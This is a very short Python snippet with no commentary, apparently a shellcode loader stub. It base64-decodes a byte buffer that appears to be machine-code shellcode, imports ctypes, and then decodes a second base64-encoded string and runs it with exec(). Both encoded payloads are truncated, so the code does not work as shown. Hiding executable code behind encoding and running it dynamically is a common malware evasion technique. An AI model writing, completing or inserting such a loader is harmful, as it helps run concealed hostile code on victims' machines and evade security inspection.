import base64
import ctypes

buf = base64.b64decode(b'/EiD5PDoyAAAAEFR...')

base64_loader = base64.b64decode(b'CnNoZWxsY2...').decode()
exec(base64_loader)